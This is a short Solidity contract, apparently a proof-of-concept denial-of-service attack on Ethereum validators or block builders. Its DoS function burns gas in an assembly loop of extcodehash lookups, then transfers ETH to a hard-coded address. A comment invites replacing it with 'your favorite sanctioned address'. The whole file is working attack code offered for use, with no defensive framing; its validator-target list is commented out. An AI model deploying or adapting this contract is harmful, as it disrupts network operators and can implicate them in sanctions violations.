pragma solidity >=0.7.0 <0.9.0;
contract ConditionalExhaustCoinbaseVariant {
mapping (address => bool) private _shouldDoS;
/// @notice Creates a set of the validators to DoS.
constructor() {
//_shouldDoS[AddressToDoS1] = true;
// _shouldDoS[AddressToDoS2] = true;
// ...
}
function DoS(uint32 i) external payable {
bool shouldDoS = true;
assembly {
if shouldDoS {
// The computationally complex part of the TX:
for { } gt(i, 0) { i := sub(i, 1) } {
pop(extcodehash(xor(blockhash(number()), gas())))
}
// Replace "CensoredAddress" with your favorite
// sanctioned address!
pop(call(gas(), 0x8943545177806ED17B9F23F0a21ee5948eCaa776, 500000, 0, 0, 0, 0))
}
stop()
}
}
}
